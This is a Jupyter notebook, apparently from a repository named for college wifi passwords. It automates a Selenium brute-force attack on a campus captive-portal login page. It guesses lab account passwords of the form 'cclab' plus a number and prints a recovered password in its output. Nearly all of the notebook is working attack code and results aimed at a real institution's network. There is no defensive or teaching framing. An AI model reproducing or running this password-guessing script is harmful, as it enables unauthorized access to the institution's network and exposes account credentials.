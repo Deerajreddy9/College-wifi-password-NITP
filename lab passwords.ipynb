{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import random\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "# specifies the path to the chromedriver.exe\n",
    "driver = webdriver.Chrome('C:/Users/Admin/Downloads/chromedriver') #Change to your chrome web driver location\n",
    "\n",
    "# driver.get method() will navigate to a page given by the URL address\n",
    "driver.get('http://172.172.172.100:8090/httpclient.html')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter any number between 2 to 8\n",
      "2\n"
     ]
    }
   ],
   "source": [
    "lab = \"lab\"\n",
    "i = input(\"Enter any number between 2 to 8\\n\")\n",
    "lab += i\n",
    "driver.find_element_by_name('username').send_keys(lab)\n",
    "start = int(i)*100 #you can change the start variable\n",
    "end = int(i)*100+101 #you can change the start variable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cclab200\n",
      "cclab201\n",
      "cclab202\n",
      "cclab203\n",
      "cclab204\n",
      "cclab205\n",
      "cclab206\n",
      "cclab207\n",
      "cclab208\n",
      "cclab209\n",
      "cclab210\n",
      "cclab211\n",
      "cclab212\n",
      "cclab213\n",
      "cclab214\n",
      "cclab215\n",
      "cclab216\n",
      "cclab217\n",
      "cclab218\n",
      "cclab219\n",
      "cclab220\n",
      "cclab221\n",
      "cclab222\n",
      "cclab223\n",
      "cclab224\n",
      "cclab225\n",
      "cclab226\n",
      "cclab227\n",
      "cclab228\n",
      "cclab229\n",
      "cclab230\n",
      "cclab231\n",
      "cclab231\n"
     ]
    }
   ],
   "source": [
    "found = 0\n",
    "for i in range (start,end):\n",
    "    try:\n",
    "        string=\"cclab\"\n",
    "        string=string+str(i)\n",
    "        print(string)\n",
    "        driver.find_element_by_name(\"password\").send_keys(string)\n",
    "        driver.find_element_by_name(\"btnSubmit\").click()\n",
    "        time.sleep(2)\n",
    "        te = driver.find_element_by_class_name(\"errorfont\")\n",
    "    except:\n",
    "        print(string)\n",
    "        found = 1\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Password for lab2 is: cclab231\n"
     ]
    }
   ],
   "source": [
    "if(found):\n",
    "    print(\"Password for \" + lab + \" is: \" + string)\n",
    "else:\n",
    "    print(\"Try extending the range\\n\") #change start and end variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
